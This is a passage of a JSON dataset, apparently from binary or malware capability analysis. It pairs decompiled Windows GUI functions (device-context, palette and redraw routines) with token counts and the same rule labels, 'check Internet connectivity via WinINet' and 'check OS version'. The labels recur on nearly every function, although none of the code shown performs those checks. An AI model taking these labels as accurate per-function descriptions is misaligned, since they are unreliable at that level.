            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c13c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.004037f0();\n        *in_EAX = iVar1;\n    }\n    fcn.0041c358();\n    return;\n}\n",
        "token_count": 77
    },
    "0043c164": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c164(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.0041c688();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00403820();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0043c270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c270(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x43c280;\n    var_8h = fcn.0041c8b0();\n    uStack24 = 0x43c30e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x43c2ab;\n            var_ch = fcn.0041c4c8();\n            puStack32 = 0x43c2b6;\n            cVar1 = fcn.00426ee8();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x43c2e6;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0043c3f0();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x43c2ed;\n                uStack36 = 0x43c2e5;\n                fcn.00426f44();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x43c315;\n    uStack24 = 0x43c30d;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 467
    },
    "0043c348": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c348(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x43c361;\n        fcn.004270c8();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x43c379;\n            iVar1 = fcn.0041c8b0();\n            uStack20 = 0x43c3cd;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.0043c1b4();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.0041c358();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x43c3d4;\n            uStack20 = 0x43c3cc;\n            fcn.0041c914();\n            return;\n        }\n        puStack16 = 0x43c3e2;\n        fcn.004270cc();\n        puStack16 = 0x43c3ea;\n        fcn.0043c43c();\n    }\n    return;\n}\n",
        "token_count": 390
    },
    "0043c3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c3f0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.004270cc();\n        fcn.0041c8c4();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0043c5a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043c5a8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.0043c5a8::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x43c675;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x43c5dd;\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x43c5ef;\n        cVar1 = fcn.00403a28();\n        if ((((cVar1 != '\\0') && (*(**0x48466c + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.0043c5a8::var_8h;\n            fcn.0044cafc();\n            fcn.00409998(arg_8h);\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x43c67c;\n    iStack56 = 0x43c66c;\n    fcn.004045c8();\n    iStack56 = 0x43c674;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 487
    },
    "0043c948": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0043c948(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0042273c();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x74);\n    in_EAX[0x14] = *0x43ca18;\n    iVar1 = fcn.00425f64();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x43d8f8;\n    *(in_EAX + 0x61) = *0x43ca1c;\n    iVar1 = fcn.0043c468();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x43e7bc;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x9a) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7a) = 0xfff4;\n    in_EAX[0x2e] = *0x453c04;\n    *(in_EAX + 0x54) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 530
    },
    "0043cb14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043cb14(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_stack_ffffffe8;\n    uint uStack20;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar1 = fcn.00403a28(in_stack_ffffffe8 & 0xffffff00 | param_2);\n        if (iVar1 != 0) {\n            uStack20 = (**(*in_EAX + 0x48))();\n            uVar2 = sub.gdi32.dll_SelectPalette();\n            iVar1 = sub.gdi32.dll_RealizePalette(uStack20);\n            if (iVar1 != 0) {\n                (**(*in_EAX + 0x7c))();\n            }\n            sub.gdi32.dll_SelectPalette(uStack20, uVar2, 0xffffffff);\n            sub.user32.dll_ReleaseDC(uVar2);\n            uVar2 = 1;\n        }\n    }\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 254
    },
    "0043cc84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cc84(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x68))();\n    }\n    fcn.00422b9c();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0043cd18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cd18(char param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.00422a58();\n    if (param_1 == '\\x01') {\n        if (param_2 == in_EAX[0x1f]) {\n            fcn.0043d800();\n        }\n        else {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (param_2 == iVar1) {\n                fcn.0043cbbc();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0043d04c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d04c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0xa0)) {\n        if ((*(in_EAX + 0xa0) != 0) && (*(*(in_EAX + 0xa0) + 0x178) != 0)) {\n            puStack40 = 0x43d092;\n            fcn.0041c688();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x178) != 0)) {\n            puStack40 = 0x43d0b2;\n            fcn.0041c358();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x43d147;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.00403a28();\n    }\n    iVar1 = *(in_EAX + 0xa0);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0xa0) = 0;\n        }\n        else {\n            *(in_EAX + 0xa0) = param_2;\n            if (param_2 != 0) {\n                fcn.00403a28();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.00403a28();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 492
    },
    "0043d2d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043d2d0(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43d351;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.0040675c();\n        fcn.0040c918(in_stack_ffffffd4, arg_ch);\n        fcn.00403fc0();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x43d358;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 395
    },
    "0043d3e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d3e8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0xa0) != 0) && (*0x485ac8 == 0)) && (*0x43d450 == (*0x43d44c & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.0043e9fc(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "0043d974": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d974(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.0043e9fc(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0043da0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043da0c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.0043e9fc(0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0043da30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043da30(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x60)) && (*(in_EAX + 0x60) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.0043e9fc(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0043db5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043db5c(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43dbf2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.0040675c();\n        fcn.0040c918(uVar2, arg_ch);\n        fcn.00403fc0();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.004045c8(0x43dbf9);\n    return;\n}\n",
        "token_count": 401
    },
    "0043dc04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0043dc04(int32_t lprcSrc1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    uVar1 = fcn.0041c52c();\n    uVar2 = uVar1;\n    do {\n        do {\n            if (uVar1 < 1) {\n                var_1h._0_1_ = 0;\n                goto code_r0x0043dc85;\n            }\n            uVar1 = uVar1 - 1;\n            uVar2 = fcn.0041c4c8();\n        } while ((*(uVar2 + 0x57) == '\\0') || ((*(uVar2 + 0x50) & 0x40) == 0));\n        fcn.0043d1e8();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        uVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (uVar2 == 0);\ncode_r0x0043dc85:\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 345
    },
    "0043dc90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043dc90(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.00444380();\n    if (cVar2 != '\\0') {\n        fcn.0043d1e8();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.0043dc04(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.0044407c(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "0043dd84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043dd84(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x43ddc9;\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x43dde9;\n                uStack20 = fcn.0044407c();\n                puStack24 = 0x43ddef;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x43de5d;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.00441e50();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.0044407c(uVar2, 0x43de77);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x43de6c;\n            (**(*in_EAX + 0x7c))();\n            uStack20 = 0x43de77;\n            (**(*in_EAX + 0x88))();\n        }\n    }\n    return;\n}\n",
        "token_count": 507
    },
    "0043de80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043de80(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "0043deb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043deb0(void)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (iVar1 = (in_EAX & 0xffffff00 | *(in_EAX + 0x5f)) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "0043dfb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043dfb8(uchar *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xf2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xf0))(arg_8h, arg_10h & 0xffffff00 | arg_ch & 0xff, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0043dff4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043dff4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xea) != 0) {\n        (**(in_EAX + 0xe8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0043e040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e040(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x11a) != 0) {\n        (**(in_EAX + 0x118))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0043e150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e150(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0043e19c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0043e19c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint8_t var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = 0;\n    uVar2 = in_EAX;\n    if (*(in_EAX + 0x13a) != 0) {\n        uVar2 = (**(in_EAX + 0x138))(&var_ah, &var_9h);\n    }\n    if (var_ah == 0) {\n        *(in_EAX + 0xa4) = *(in_EAX + 0xa4) + in_ECX;\n        while (uVar2 = *(in_EAX + 0xa4) >> 0x1f,  uVar2 = (*(in_EAX + 0xa4) ^ uVar2) - uVar2,  0x77 < uVar2) {\n            iVar1 = *(in_EAX + 0xa4);\n            uVar2 = *(in_EAX + 0xa4) >> 0x1f;\n            *(in_EAX + 0xa4) = ((*(in_EAX + 0xa4) ^ uVar2) - uVar2) + -0x78;\n            if (iVar1 < 0) {\n                if (*(in_EAX + 0xa4) != 0) {\n                    *(in_EAX + 0xa4) = -*(in_EAX + 0xa4);\n                }\n                var_ah = fcn.00403a28();\n            }\n            else {\n                var_ah = fcn.00403a28();\n            }\n        }\n    }\n    return uVar2 & 0xffffff00 | var_ah;\n}\n",
        "token_count": 464
    },
    "0043e304": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
